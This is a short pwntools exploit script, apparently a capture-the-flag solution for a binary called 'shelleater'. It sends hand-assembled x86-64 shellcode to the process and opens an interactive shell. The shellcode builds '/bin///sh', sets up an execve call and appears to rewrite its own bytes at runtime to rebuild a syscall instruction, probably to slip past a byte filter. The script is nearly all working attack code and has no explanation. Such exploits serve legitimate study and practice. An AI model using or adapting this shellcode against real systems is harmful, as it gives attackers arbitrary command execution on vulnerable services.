from pwn import *

p = process("./shelleater")
# p = remote("127.0.0.1", 5000)

payload = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x8a, 0xd, 0xe, 0x0, 0x0, 0x0, 0xfe, 0xc1, 0xfe, 0xc1, 0x88, 0xd, 0x4, 0x0, 0x0, 0x0, 0x90, 0x90, 0x90, 0x90, 0xd, 0x5]

p.recvuntil(b"shell go here :)\n")
p.sendline(bytes(payload))
p.interactive()
